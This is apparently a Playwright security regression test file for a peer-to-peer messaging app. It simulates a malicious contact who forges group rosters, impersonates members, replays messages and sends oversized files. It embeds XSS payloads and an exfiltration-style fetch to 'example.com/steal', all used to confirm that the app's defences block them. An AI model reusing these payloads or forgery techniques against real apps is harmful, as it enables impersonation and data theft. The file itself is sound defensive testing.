// Security regression tests: each fix is attacked from a real, paired phone.
// The app is served from a TEST-ONLY copy with internal hooks (window.__t) so a
// "malicious" phone can send hand-crafted messages. The shipped files have no hooks.
import { chromium } from "playwright-core";
import { readFileSync, writeFileSync, rmSync, cpSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { serve, chromeOptions } from "./serve.mjs";

// Run from the repo folder:  node tests/security.test.mjs
const SRC = process.argv[2] || "web";
const ANDROID = process.argv[3] || "android";
const DIR = join(tmpdir(), "cyanotype-security-test");
rmSync(DIR, { recursive: true, force: true });
cpSync(SRC, DIR, { recursive: true });
const app = readFileSync(join(DIR, "app.js"), "utf8");
const hook = `  window.__t = { links, link, conversation, conversations, contact, get backend() { return backend; }, me: () => me, decodeSignal, b32decode, seal, outbox, putEnvelope, carrySeal, carryFlush, rejoinStart, callPeer: () => callPeer(), importGroupKey, F_TEXT, F_CHUNK, b64, bytesToHex, sign };\n  function wireUI() {`;
if (!app.includes("  function wireUI() {")) throw new Error("hook point missing");
writeFileSync(join(DIR, "app.js"), app.replace("  function wireUI() {", hook));

const PORT = 8771;
const server = await serve(DIR, PORT);

let failures = 0;
const ok = (cond, msg) => { console.log((cond ? "  PASS " : "  FAIL ") + msg); if (!cond) failures++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms = 10000, label = "condition") {
  const end = Date.now() + ms;
  while (Date.now() < end) { try { if (await fn()) return true; } catch {} await sleep(150); }
  throw new Error("timed out waiting for " + label);
}

const browser = await chromium.launch(chromeOptions(["--use-fake-device-for-media-stream", "--use-fake-ui-for-media-stream", "--disable-features=WebRtcHideLocalIpsWithMdns"]));
const errors = [];
async function phone(name) {
  const ctx = await browser.newContext({ permissions: ["camera", "microphone"] });
  await ctx.addInitScript(`window.BarcodeDetector = class { static async getSupportedFormats(){return ["qr_code"]} async detect(){ return window.__qr ? [{rawValue: window.__qr}] : [] } };`);
  const page = await ctx.newPage();
  page.on("pageerror", (e) => errors.push(`${name}: ${e.message}`));
  page.on("console", (m) => { if (m.type() === "error") errors.push(`${name} console: ${m.text()}`); });
  await page.goto(`http://localhost:${PORT}/index.html`);
  await until(() => page.evaluate(() => document.getElementById("state").dataset.state === "idle"), 15000, name + " boot");
  page.id = await page.evaluate(() => window.__t.me().selfId);
  page.label = name;
  return page;
}
const screen = (p) => p.evaluate(() => document.querySelector(".screen.on").id);
const qrOf = (p) => p.evaluate(() => {
  const c = document.getElementById("qrOut");
  const d = c.getContext("2d").getImageData(0, 0, c.width, c.height);
  return jsQR(d.data, c.width, c.height).data;
});
const sheetOn = (p) => p.evaluate(() => document.getElementById("menuSheet").classList.contains("on"));
const clickAction = (p, label) => p.locator("#menuActs .btn", { hasText: label }).first().click();
const linked = (p, q) => p.evaluate((id) => !!(window.__t.link(id) && window.__t.link(id).open), q.id);
const ctrl = (from, to, msg) => from.evaluate(([id, m]) => window.__t.link(id).sendCtrl(m), [to.id, msg]);
const convOf = (p, id) => p.evaluate((i) => window.__t.conversation(i), id);

/* Pair X (shows code) with Y (scans). start(): what X taps to show its code. */
async function pair(X, Y, { start = () => X.click("#btnInvite"), xName, yName, confirm = true } = {}) {
  await start();
  await until(async () => (await screen(X)) === "s-pair", 15000, "invite QR");
  const invite = await qrOf(X);
  await Y.evaluate(() => window.cyanotypeBack && document.querySelector(".screen.on").id !== "s-home" && window.cyanotypeBack());
  await Y.evaluate((q) => { window.__qr = q; }, invite);
  await Y.click("#btnJoin");
  await until(async () => (await screen(Y)) === "s-pair", 15000, "reply QR");
  const reply = await qrOf(Y);
  await X.evaluate((q) => { window.__qr = q; }, reply);
  await X.click("#pairAction");
  return invite;
}
async function confirmSafety(P, name) {
  await until(async () => (await screen(P)) === "s-safety", 20000, P.label + " safety");
  await P.fill("#nameInput", name);
  await P.click("#safetyConfirm");
}
async function home(P) {
  for (let i = 0; i < 4 && (await screen(P)) !== "s-home"; i++) await P.evaluate(() => window.cyanotypeBack());
  if (await sheetOn(P)) await P.evaluate(() => window.cyanotypeBack());
}

try {
  const A = await phone("A"), B = await phone("B"), C = await phone("C"), D = await phone("D");

  console.log("Known flaw 1: the pairing secret is never in the QR code");
  const invite = await pair(A, B);
  await confirmSafety(A, "Bea"); await confirmSafety(B, "Al");
  await until(() => linked(A, B), 8000, "A-B link");
  const qr = await A.evaluate(async (text) => {
    const d = await window.__t.decodeSignal(text);
    return { hasSecret: "secret" in d && !!d.secret, eph: d.eph ? d.eph.length : 0, raw: window.__t.bytesToHex(window.__t.b32decode(text), "") };
  }, invite);
  const secA = await A.evaluate(async (id) => window.__t.bytesToHex(new Uint8Array((await window.__t.contact(id)).secret), ""), B.id);
  const secB = await B.evaluate(async (id) => window.__t.bytesToHex(new Uint8Array((await window.__t.contact(id)).secret), ""), A.id);
  ok(!qr.hasSecret && qr.eph === 65, "invite carries a one-time public key (65 bytes), not a secret");
  ok(secA === secB && secA.length === 64, "both phones worked out the same 32-byte secret independently");
  ok(!qr.raw.includes(secA), "that secret appears nowhere in the QR code's bytes");

  await home(A); await home(B);
  await pair(A, C); await confirmSafety(A, "Cam"); await confirmSafety(C, "Al");
  await until(() => linked(A, C), 8000, "A-C link");
  await home(A); await home(C);
  await pair(B, C); await confirmSafety(B, "Cam"); await confirmSafety(C, "Bea");
  await until(() => linked(B, C), 8000, "B-C link");
  await home(B); await home(C);

  console.log("Known flaw 2: every connection gets its own keys");
  const probe = () => A.evaluate(async (id) => window.__t.bytesToHex(new Uint8Array(await window.__t.seal(window.__t.link(id).sendKey, 1, "probe")), ""), B.id);
  const before = await probe();
  await A.evaluate((id) => window.__t.link(id).close(), B.id);
  await until(async () => !(await linked(A, B)) && !(await linked(B, A)), 8000, "A-B closed");
  await sleep(500);
  await A.evaluate((id) => window.__t.rejoinStart(id), B.id);
  await until(async () => (await linked(A, B)) && (await linked(B, A)), 20000, "A-B rejoined via C");
  const after = await probe();
  ok(before.slice(0, 24) === after.slice(0, 24) && before !== after, "same message counter, different ciphertext after reconnecting: the key changed");
  const dmAB = (await A.evaluate((id) => window.__t.conversations().then((cs) => cs.find((c) => c.type === "direct" && c.peerId === id).id), B.id));
  await A.evaluate(([cid, id]) => window.__t.link(id).sendText(cid, "after rejoin", "m-rejoin"), [dmAB, B.id]);
  await until(() => B.evaluate(async (id) => (await window.__t.backend.getAll("messages")).some((m) => m.rid === "m-rejoin"), A.id), 6000, "msg after rejoin").catch(() => {});
  ok(await B.evaluate(async () => (await window.__t.backend.getAll("messages")).some((m) => m.rid === "m-rejoin")), "messages still flow on the reconnected link, so both sides derived the same new keys");

  console.log("Setting up a group hosted by A, with B and C");
  await home(A);
  await A.click("#btnGroup"); await A.fill("#menuBody input", "Climbing club"); await clickAction(A, "Create group");
  await until(async () => (await screen(A)) === "s-chat", 4000, "group open");
  const G = await A.evaluate(() => window.__t.conversations().then((cs) => cs.find((c) => c.type === "group").id));
  for (const [P, nm] of [[B, "B"], [C, "C"]]) {
    await home(A);
    await A.locator("#convList .row", { hasText: "Climbing club" }).click();
    await until(async () => (await screen(A)) === "s-chat", 4000, "group chat open");
    await pair(A, P, { start: () => A.click("#groupAdd") });
    await until(() => sheetOn(P), 15000, nm + " invite sheet");
    ok((await P.textContent("#menuTitle")) === "Join Climbing club?", `${nm} is asked before joining: "${await P.textContent("#menuTitle")}"`);
    ok(!(await convOf(P, G)), `${nm} has not joined before answering`);
    await clickAction(P, "Join group");
    await until(async () => !!(await convOf(P, G)), 4000, nm + " joined");
    await home(P);
    await until(() => linked(A, P), 8000, "re-link");
  }
  await until(async () => ((await convOf(B, G)).members || []).includes(C.id), 6000, "roster to B").catch(() => {});
  ok(((await convOf(B, G)).members || []).includes(C.id), "B received the host's member list naming C (the host's roster is still trusted)");

  console.log("Fix 1 + 3: a member cannot pose as the host to rewrite the member list");
  const cBefore = await convOf(C, G);
  await ctrl(B, C, { t: "group-roster", convId: G, members: [C.id], names: { [A.id]: "Mallory" }, peerId: A.id });
  await sleep(800);
  const cAfter = await convOf(C, G);
  ok(JSON.stringify(cAfter.members) === JSON.stringify(cBefore.members) && JSON.stringify(cAfter.names) === JSON.stringify(cBefore.names), "C ignored B's roster even though it claimed to come from A");

  console.log("Fix 2: a contact cannot hijack an existing group, or add you without asking");
  await ctrl(B, C, { t: "group-invite", convId: G, title: "Hijacked", groupKey: btoa(String.fromCharCode(...new Array(32).fill(7))), members: [], names: {}, peerId: A.id });
  await sleep(800);
  const cG = await convOf(C, G);
  ok(cG.title === "Climbing club" && cG.hostId === A.id && !(await sheetOn(C)), "C's group kept its name, host and key; no takeover prompt");
  await ctrl(B, C, { t: "group-invite", convId: "fresh-group", title: "Secret plans", groupKey: btoa(String.fromCharCode(...new Array(32).fill(9))), members: [B.id], names: {} });
  await until(() => sheetOn(C), 5000, "consent sheet");
  ok((await C.textContent("#menuTitle")) === "Join Secret plans?" && !(await convOf(C, "fresh-group")), "a new invitation asks first and creates nothing yet");
  await clickAction(C, "Decline");
  await sleep(500);
  ok(!(await convOf(C, "fresh-group")), "declining leaves no trace");

  console.log("Fix 4: a member cannot post as someone else");
  const forge = (P, from, text, id) => P.evaluate(async ([g, f, t, i]) => {
    const conv = await window.__t.conversation(g);
    const key = await window.__t.importGroupKey(conv.groupKey);
    const nonce = crypto.getRandomValues(new Uint8Array(12));
    const ct = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-GCM", iv: nonce }, key, new TextEncoder().encode(JSON.stringify({ id: i, from: f, text: t, at: Date.now() }))));
    const all = new Uint8Array(12 + ct.length); all.set(nonce); all.set(ct, 12);
    return window.__t.b64(all);
  }, [G, from, text, id]);
  const texts = (P) => P.evaluate(async (g) => {
    const rows = await window.__t.backend.byConv(g);
    return rows.map((r) => ({ from: r.from, rid: r.rid }));
  }, G);
  const asHost = await forge(B, A.id, "I am the host, honest", "f1");
  await ctrl(B, C, { t: "group-msg", convId: G, packed: asHost });
  const asC = await forge(B, C.id, "Cam here, totally", "f2");
  await ctrl(B, A, { t: "group-msg", convId: G, packed: asC });
  await sleep(1000);
  ok(!(await texts(C)).some((r) => r.rid === "f1"), "C rejected a message B sent directly while claiming to be the host");
  ok(!(await texts(A)).some((r) => r.rid === "f2") && !(await texts(C)).some((r) => r.rid === "f2"), "the host rejected B's message claiming to be from C, and did not relay it");
  const honest = await forge(B, B.id, "Bea here, really", "f3");
  await ctrl(B, A, { t: "group-msg", convId: G, packed: honest });
  await until(async () => (await texts(C)).some((r) => r.rid === "f3"), 6000, "honest relay").catch(() => {});
  const got = (await texts(C)).find((r) => r.rid === "f3");
  ok(!!got && got.from === B.id, "an honest message from B reaches C through the host, attributed to B");

  console.log("Reactions: the reactor is whoever's link it came on");
  const forgeBody = (P, body) => P.evaluate(async ([g, b]) => {
    const conv = await window.__t.conversation(g);
    const key = await window.__t.importGroupKey(conv.groupKey);
    const nonce = crypto.getRandomValues(new Uint8Array(12));
    const ct = new Uint8Array(await crypto.subtle.encrypt({ name: "AES-GCM", iv: nonce }, key, new TextEncoder().encode(JSON.stringify({ ...b, at: Date.now() }))));
    const all = new Uint8Array(12 + ct.length); all.set(nonce); all.set(ct, 12);
    return window.__t.b64(all);
  }, [G, body]);
  const reactsOn = (P, rid) => P.evaluate(async ([g, r]) => {
    const row = (await window.__t.backend.byConv(g)).find((m) => m.rid === r);
    const out = {};
    for (const [k, v] of Object.entries((row && row.reactions) || {})) out[k] = v.e;
    return out;
  }, [G, rid]);
  const thumbs = "\u{1F44D}", laugh = "\u{1F602}";
  await ctrl(B, A, { t: "group-msg", convId: G, packed: await forgeBody(B, { id: "r1", from: B.id, kind: "react", target: "f3", author: B.id, emoji: thumbs }) });
  await until(async () => (await reactsOn(C, "f3"))[B.id] === thumbs, 6000, "group reaction relayed").catch(() => {});
  ok((await reactsOn(A, "f3"))[B.id] === thumbs && (await reactsOn(C, "f3"))[B.id] === thumbs, "B's reaction in the group reaches the host and is relayed to C, credited to B");
  await ctrl(B, A, { t: "group-msg", convId: G, packed: await forgeBody(B, { id: "r2", from: C.id, kind: "react", target: "f3", author: B.id, emoji: laugh }) });
  await sleep(800);
  ok(!(C.id in (await reactsOn(A, "f3"))) && !(C.id in (await reactsOn(C, "f3"))), "B cannot react in C's name: the host refuses it and relays nothing");
  await ctrl(B, A, { t: "group-msg", convId: G, packed: await forgeBody(B, { id: "r3", from: B.id, kind: "react", target: "f3", author: B.id, emoji: "<img src=x onerror=alert(1)>" }) });
  await sleep(800);
  ok((await reactsOn(A, "f3"))[B.id] === thumbs, "anything but the six reactions is ignored");
  await ctrl(B, C, { t: "react", convId: G, target: "f3", author: B.id, emoji: laugh, at: Date.now() + 1e3 });
  await sleep(800);
  ok((await reactsOn(C, "f3"))[B.id] === thumbs, "a reaction sent outside the group cannot land on a group message");

  console.log("Fix 10: replays, outsiders and bad coordinates");
  await ctrl(B, A, { t: "group-msg", convId: G, packed: honest });
  await sleep(800);
  ok((await texts(C)).filter((r) => r.rid === "f3").length === 1 && (await texts(A)).filter((r) => r.rid === "f3").length === 1, "the same sealed message sent again is stored once");
  await C.evaluate(() => window.__t.backend.put("conversations", { id: "c-only", type: "group", title: "C only", hostId: window.__t.me().selfId, members: [], groupKey: new Uint8Array(32), names: {}, lastAt: Date.now() }));
  await B.evaluate((id) => window.__t.link(id).sendText("c-only", "let me in", "outsider"), C.id);
  await sleep(800);
  const outsider = await C.evaluate(async () => (await window.__t.backend.getAll("messages")).find((m) => m.rid === "outsider"));
  ok(!!outsider && outsider.convId !== "c-only", "a non-member's message aimed at a group lands in their own direct chat instead");
  await ctrl(B, A, { t: "loc", convId: dmAB, shareId: "s-bad", lat: "javascript:alert(1)", lon: 5, at: Date.now(), endsAt: Date.now() + 6e5 });
  await ctrl(B, A, { t: "loc", convId: dmAB, shareId: "s-good", lat: 51.5, lon: -0.12, acc: 10, at: Date.now(), endsAt: Date.now() + 6e5 });
  await sleep(800);
  const locs = await A.evaluate(async () => (await window.__t.backend.getAll("messages")).filter((m) => m.kind === "location").length);
  ok(locs === 1, "a location with a non-numeric latitude is dropped; a real one is kept");

  console.log("Fix 6: relayed mail cannot be made to vanish by a fake delivery note");
  await A.evaluate(() => window.__t.putEnvelope({ id: "env-test", from: window.__t.me().selfId, to: "00000000deadbeef", convId: "x", kind: "text", at: Date.now(), exp: Date.now() + 36e5, hops: 0, gave: [], packed: "AAAA", sig: "AAAA" }));
  await ctrl(B, A, { t: "carry-ack", id: "env-test" });
  const bSig = await B.evaluate(async () => window.__t.b64(await window.__t.sign((await window.__t.backend.get("meta", "identity")).privateKey, new TextEncoder().encode("cyanotype/carry-ack|env-test"))));
  const bPub = await B.evaluate(() => window.__t.b64(new Uint8Array(window.__t.me().selfPub)));
  await ctrl(B, A, { t: "carry-ack", id: "env-test", pub: bPub, sig: bSig });
  await sleep(800);
  ok(await A.evaluate(async () => (await window.__t.outbox()).some((e) => e.id === "env-test")), "unsigned and wrongly-signed delivery notes are ignored; the envelope is kept");
  const dmAC = await A.evaluate((id) => window.__t.conversations().then((cs) => cs.find((c) => c.type === "direct" && c.peerId === id).id), C.id);
  const env = await A.evaluate(([to, cid]) => window.__t.carrySeal(to, cid, "text", { text: "sealed letter" }).then((e) => e.id), [C.id, dmAC]);
  await until(() => A.evaluate(async (id) => !(await window.__t.outbox()).some((e) => e.id === id), env), 10000, "real ack").catch(() => {});
  ok(await A.evaluate(async (id) => !(await window.__t.outbox()).some((e) => e.id === id), env), "a real delivery note, signed by the recipient, is accepted");
  ok(await C.evaluate(async () => (await window.__t.backend.getAll("messages")).some((m) => m.state === "relayed")), "and C really received the sealed letter");

  console.log("Fix 8: a contact cannot crash the app with a fake file");
  await ctrl(B, A, { t: "file-start", id: "huge", convId: dmAB, size: 5e9, total: 1, mime: "x/y", name: "x" });
  await ctrl(B, A, { t: "file-start", id: "neg", convId: dmAB, size: 100, total: -5, mime: "x/y", name: "x" });
  await sleep(300);
  ok(await A.evaluate((id) => window.__t.link(id).streams.size === 0, B.id), "transfers announcing 5 GB or a negative piece count are refused");
  await ctrl(B, A, { t: "file-start", id: "small", convId: dmAB, size: 100, total: 1, mime: "text/plain", name: "a.txt" });
  await B.evaluate(async ([id, F]) => {
    const head = new TextEncoder().encode("small\n");
    const frame = new Uint8Array(head.length + 4 + 5000);
    frame.set(head);
    await window.__t.link(id)._send(F, frame, 7);
  }, [A.id, await B.evaluate(() => window.__t.F_CHUNK)]);
  await sleep(500);
  ok(await A.evaluate((id) => window.__t.link(id).streams.size === 0, B.id) && !(await A.evaluate(async () => (await window.__t.backend.getAll("messages")).some((m) => m.name === "a.txt"))), "a piece larger than the announced size ends the transfer, and nothing is saved");

  console.log("Fix 9: only the person you are calling can hang up");
  await home(A);
  await A.locator("#convList .row", { hasText: "Cam" }).click();
  await A.click("#callBtn");
  await until(() => C.evaluate(() => document.getElementById("ringSheet").classList.contains("on")), 8000, "ring");
  await C.click("#acceptBtn");
  await until(async () => (await A.evaluate(() => window.__t.callPeer())) === C.id, 5000, "call up");
  await ctrl(B, A, { t: "call-end" });
  await sleep(800);
  ok((await A.evaluate(() => window.__t.callPeer())) === C.id, "B's 'call ended' did not end A's call with C");
  await A.click("#hangupBtn");
  await until(async () => !(await A.evaluate(() => window.__t.callPeer())), 4000, "hung up").catch(() => {});

  console.log("Fix 5: the safety number protects group additions, and 'They don't match' cancels");
  await home(A);
  await A.locator("#convList .row", { hasText: "Climbing club" }).click();
  await pair(A, D, { start: () => A.click("#groupAdd") });
  await until(async () => (await screen(A)) === "s-safety", 20000, "A safety for D");
  ok(!((await convOf(A, G)).members || []).includes(D.id), "a new person is not added to the group before the safety check");
  await A.click("#safetyReject");
  await sleep(800);
  ok(!(await A.evaluate((id) => window.__t.contact(id), D.id)), "'They don't match' deletes the contact");
  ok(!((await convOf(A, G)).members || []).includes(D.id) && !(await linked(A, D)), "they never join the group and the link is closed");

  console.log("Fix 7: backups are off");
  const manifest = readFileSync(join(ANDROID, "app/src/main/AndroidManifest.xml"), "utf8");
  const rules = readFileSync(join(ANDROID, "app/src/main/res/xml/data_extraction_rules.xml"), "utf8");
  ok(/allowBackup="false"/.test(manifest) && /dataExtractionRules="@xml\/data_extraction_rules"/.test(manifest), "the manifest turns off backup and points at the transfer rules");
  ok(/<cloud-backup>[\s\S]*domain="root"[\s\S]*<\/cloud-backup>/.test(rules) && /<device-transfer>[\s\S]*domain="root"[\s\S]*<\/device-transfer>/.test(rules), "cloud backup and phone-to-phone transfer both exclude the app's data");

  console.log("Fix 11 + 12: storage isolation and the content security policy");
  await A.click("#settingsBtn"); await A.click("#diagBtn");
  await until(() => A.evaluate(() => [...document.querySelectorAll(".diagRow")].some((r) => r.textContent.includes("storage isolation"))), 5000, "diag rows").catch(() => {});
  ok(await A.evaluate(() => [...document.querySelectorAll(".diagRow")].some((r) => r.textContent.includes("storage isolation") && r.textContent.includes("own site"))), "Diagnostics reports whether storage is shared with other pages");
  const csp = await A.evaluate(async () => {
    document.body.insertAdjacentHTML("beforeend", '<img src="x" onerror="window.__pwned = 1">');
    let fetched = "blocked";
    try { await fetch("https://example.com/steal?d=1"); fetched = "sent"; } catch (e) {}
    await new Promise((r) => setTimeout(r, 500));
    return { ran: !!window.__pwned, fetched, inline: document.querySelectorAll("script:not([src])").length };
  });
  ok(!csp.ran, "injected HTML cannot run script (inline handlers are blocked)");
  ok(csp.fetched === "blocked", "the page cannot send data to an outside server");
  ok(csp.inline === 0, "the page has no inline scripts left to allow");
} catch (e) {
  failures++;
  console.log("  ERROR " + e.message);
} finally {
  // Expected noise: the CSP blocks above report themselves as console errors.
  const real = errors.filter((e) => !/Failed to load resource|Content Security Policy|Refused to/.test(e));
  if (real.length) { failures += real.length; console.log("Page errors:\n  " + real.join("\n  ")); }
  console.log(failures ? `\n${failures} problem(s)` : "\nAll security checks passed");
  await browser.close();
  server.close();
  process.exit(failures ? 1 : 0);
}
